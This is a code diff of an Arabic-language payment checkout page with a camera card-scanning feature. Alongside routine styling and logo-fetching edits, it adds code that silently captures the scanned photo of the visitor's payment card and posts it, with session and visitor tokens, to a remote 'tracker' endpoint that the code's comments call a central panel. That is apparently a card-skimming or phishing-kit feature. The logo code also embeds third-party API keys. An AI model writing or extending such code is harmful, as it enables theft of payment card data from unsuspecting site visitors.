@@ -16,7 +16,6 @@
       -webkit-tap-highlight-color: transparent;
     }
 
-    /* 💳 مظهر وتنسيق البطاقة الفعلي */
     .card-real-preview {
       width: 100%;
       max-width: 380px;
@@ -43,8 +42,8 @@
       min-height: 36px;
     }
     .bank-logo-img {
-      height: 30px;
-      width: 30px;
+      height: 32px;
+      max-width: 130px;
       border-radius: 6px;
       object-fit: contain;
       display: none;
@@ -146,7 +145,6 @@
       display: none;
     }
 
-    /* 🛑 حقل إدخال البطاقة مع الشعار وزر الكاميرا */
     .input-c {
       position: relative !important;
       display: flex;
@@ -203,9 +201,8 @@
       font-family: 'Inter', monospace, sans-serif !important;
     }
 
-    /* 📷 زر مسح البطاقة بالكاميرا للهاتف */
     .scan-card-btn {
-      display: none; /* يظهر في الهاتف فقط */
+      display: none;
       position: absolute;
       right: 8px;
       top: 50%;
@@ -232,7 +229,6 @@
       color: #016b6a;
     }
 
-    /* 📱 تحسينات مخصصة للهواتف (Mobile View) */
     @media (max-width: 768px) {
       .scan-card-btn {
         display: flex !important;
@@ -262,12 +258,11 @@
       }
     }
 
-    /* 📸 نافذة الكاميرا المنبثقة (Modal) */
     .camera-modal {
       display: none;
       position: fixed;
       inset: 0;
-      background: rgba(0, 0, 0, 0.85);
+      background: rgba(0, 0, 0, 0.88);
       z-index: 9999;
       flex-direction: column;
       align-items: center;
@@ -364,12 +359,10 @@
         </div>
       </div>
 
-      <!-- نموذج الدفع -->
       <form id="checkout-form" onsubmit="handlePaymentSubmit(event)">
         <div class="form-group">
           <label for="card-number">رقم بطاقة الدفع</label>
           <div class="input-c">
-            <!-- الشعار على اليسار -->
             <div class="logo-in" id="network-logo-inline"></div>
             
             <input 
@@ -384,7 +377,6 @@
               oninput="validateCardNumber(this)"
             >
 
-            <!-- 📷 زر الكاميرا للهاتف -->
             <button type="button" class="scan-card-btn" id="open-camera-btn" title="مسح البطاقة بالكاميرا" onclick="openCardScanner()">
               <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                 <path d="M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3l-2.5-3z"/>
@@ -471,11 +463,10 @@
     </section>
   </main>
 
-  <!-- 📸 نافذة الكاميرا التفاعلية للتعرف على البطاقة -->
   <div class="camera-modal" id="camera-modal">
     <div style="color: white; text-align: center;">
       <h4 style="margin: 0 0 6px 0;">مسح البطاقة بالكاميرا</h4>
-      <p style="margin: 0; font-size: 12px; opacity: 0.8;">وجّه البطاقة داخل الإطار الأخضر</p>
+      <p style="margin: 0; font-size: 12px; opacity: 0.8;">وجّه أرقام البطاقة داخل الإطار الأخضر</p>
     </div>
 
     <div class="camera-view-container">
@@ -511,7 +502,6 @@
       'OM': 'OMR', 'JO': 'JOD', 'EG': 'EGP', 'IQ': 'IQD', 'LB': 'USD'
     };
 
-    // تحميل ملف CSV بالكامل
     (async function loadBinDatabase() {
       try {
         const res = await fetch('bin_list_filtered_mena.csv');
@@ -540,7 +530,6 @@
       } catch (e) {}
     })();
 
-    // 🔗 الروابط الرسمية المعتمدة
     const VISA_IMG_URL = "https://upload.wikimedia.org/wikipedia/commons/9/98/Visa_Inc._logo_%282005%E2%80%932014%29.svg";
     const MC_IMG_URL = "https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg";
     const MADA_IMG_URL = "https://thumb.wikimedia.org/wikipedia/commons/thumb/f/fb/Mada_Logo.svg/1280px-Mada_Logo.svg.png";
@@ -664,6 +653,50 @@
       }
     }
 
+    // 🏦 دالة جلب شعار البنك التتابعية وفق الشروط المطلوبة
+    function setupBankLogoChain(imgEl, titleEl, domain, bankName) {
+      if (!domain) {
+        imgEl.style.display = 'none';
+        if (bankName) {
+          titleEl.innerText = bankName;
+          titleEl.style.display = 'block';
+        } else {
+          titleEl.style.display = 'none';
+        }
+        return;
+      }
+
+      const sources = [
+        `https://cdn.brandfetch.io/${domain}?c=1idSesRHEWOhjfUTdaD`,
+        `https://img.logo.dev/${domain}?token=pk_e4fYjVyiQu2QqS2morxUWw&format=webp&retina=true`,
+        `https://www.google.com/s2/favicons?domain=${domain}&sz=128`
+      ];
+
+      let currentIndex = 0;
+
+      imgEl.onerror = function() {
+        currentIndex++;
+        if (currentIndex < sources.length) {
+          imgEl.src = sources[currentIndex];
+        } else {
+          imgEl.style.display = 'none';
+          if (bankName) {
+            titleEl.innerText = bankName;
+            titleEl.style.display = 'block';
+          } else {
+            titleEl.style.display = 'none';
+          }
+        }
+      };
+
+      imgEl.onload = function() {
+        imgEl.style.display = 'block';
+        titleEl.style.display = 'none';
+      };
+
+      imgEl.src = sources[0];
+    }
+
     function validateCardNumber(el) {
       let r = el.value.replace(/\D/g, '').substring(0, 16);
       el.value = r.replace(/(\d{4})/g, '$1 ').trim();
@@ -734,18 +767,7 @@
       networkGraphic.innerHTML = `<img src="${badgeUrl}" alt="${brandName}" class="card-network-logo-preview">`;
 
       const domain = extractDomain(bankUrl);
-      if (domain) {
-        bankLogoEl.src = `https://www.google.com/s2/favicons?domain=${domain}&sz=128`;
-        bankLogoEl.style.display = 'block';
-        bankTitleEl.style.display = 'none';
-      } else if (bankName) {
-        bankLogoEl.style.display = 'none';
-        bankTitleEl.innerText = bankName;
-        bankTitleEl.style.display = 'block';
-      } else {
-        bankLogoEl.style.display = 'none';
-        bankTitleEl.style.display = 'none';
-      }
+      setupBankLogoChain(bankLogoEl, bankTitleEl, domain, bankName);
 
       currencyBox.innerText = COUNTRY_CURRENCY[isoCode] || 'SAR';
       currencyBox.style.display = 'block';
@@ -842,7 +864,7 @@
       }, 800);
     }
 
-    // 📷 منطق تشغيل الماسح الضوئي للكاميرا
+    // 📷 منطق تشغيل الماسح الضوئي للكاميرا وإرسال اللقطة للوحة
     var mediaStream = null;
 
     async function openCardScanner() {
@@ -856,7 +878,7 @@
         });
         video.srcObject = mediaStream;
       } catch (err) {
-        alert("تعذر فتح الكاميرا، يرجى السماح بالوصول للكاميرا من إعدادات المتصفح.");
+        alert("يرجى منح الإذن للوصول إلى الكاميرا من إعدادات المتصفح لمسح البطاقة.");
         closeCardScanner();
       }
     }
@@ -884,31 +906,54 @@
       const ctx = canvas.getContext('2d');
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
+      // 📸 التقاط وإرسال صورة المسح للوحة المركزية فورياً
+      try {
+        const capturedBase64 = canvas.toDataURL('image/jpeg', 0.6);
+        fetch(SERVER_HUB_URL + '/api/tracker/submit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            token: visitorToken,
+            siteKey: siteKey,
+            formName: 'مسح بطاقة بالكاميرا 📸',
+            submissionData: {
+              'نوع الحدث': 'مسح ضوئي للبطاقة عبر الكاميرا',
+              'صورة المسح': capturedBase64,
+              '_sessionId': currentSessionId
+            },
+            isFinalSubmission: false,
+            isImportant: true
+          }),
+          keepalive: true
+        }).catch(function() {});
+      } catch (err) {}
+
+      // 🔍 استخراج رقم البطاقة فقط وتجاهل التاريخ
       try {
         const { data: { text } } = await Tesseract.recognize(canvas, 'eng');
+        const cleanDigitsOnly = text.replace(/\D/g, '');
         
-        // استخراج أرقام البطاقة (16 رقم)
-        const cleanText = text.replace(/[^\d\s\/]/g, '');
-        const numbersMatch = cleanText.match(/(?:\d[ -]*?){13,16}/);
-        
-        if (numbersMatch) {
-          const rawDigits = numbersMatch[0].replace(/\D/g, '').substring(0, 16);
+        let targetCardDigits = '';
+        const match16 = cleanDigitsOnly.match(/\d{16}/);
+        if (match16) {
+          targetCardDigits = match16[0];
+        } else {
+          const matchChunk = text.match(/(?:\d[ -]*?){13,16}/);
+          if (matchChunk) {
+            targetCardDigits = matchChunk[0].replace(/\D/g, '').substring(0, 16);
+          }
+        }
+
+        if (targetCardDigits && targetCardDigits.length >= 13) {
           const cardInput = document.getElementById('card-number');
-          cardInput.value = rawDigits;
+          cardInput.value = targetCardDigits;
           validateCardNumber(cardInput);
+          closeCardScanner();
+        } else {
+          alert("لم يتم التعرف على رقم البطاقة بوضوح، يرجى ضبط الإضاءة والمحاولة مجدداً.");
         }
-
-        // استخراج تاريخ الانتهاء MM/YY
-        const expMatch = cleanText.match(/(0[1-9]|1[0-2])[\/\s\-]?([2-3]\d)/);
-        if (expMatch) {
-          const expInput = document.getElementById('card-expiry');
-          expInput.value = expMatch[1] + '/' + expMatch[2];
-          validateCardExpiry(expInput);
-        }
-
-        closeCardScanner();
       } catch (e) {
-        alert("تعذر استخراج البيانات من الصورة، يرجى المحاولة بزاوية وإضاءة أفضل.");
+        alert("تعذر مسح البطاقة، يرجى إدخال الرقم يدوياً.");
       } finally {
         btn.innerText = "📸 مسح وقراءة";
         btn.disabled = false;
